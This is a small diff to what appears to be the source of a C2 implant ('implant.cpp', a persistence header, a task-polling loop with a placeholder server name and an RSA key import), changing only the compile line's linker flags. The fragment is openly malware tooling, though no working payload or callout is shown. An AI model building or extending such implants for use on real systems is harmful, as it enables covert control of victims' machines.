@@ -12,7 +12,7 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 
 #include "persist.h"
 
-// current compile line is - g++ implant.cpp persist.cpp -static -o implant.exe
+// current compile line is - g++ implant.cpp persist.cpp -lwinhttp -lbscrypt -static -o implant.exe
 
 #define SERVERNAME "placeholder"
 #define SLEEP 60000
@@ -32,7 +32,6 @@ void tasks()
         Sleep(SLEEP);
     }
 }
-
 
 
 BCRYPT_KEY_HANDLE importrsakey(PUCHAR pbinnput,ULONG pbinputsize){
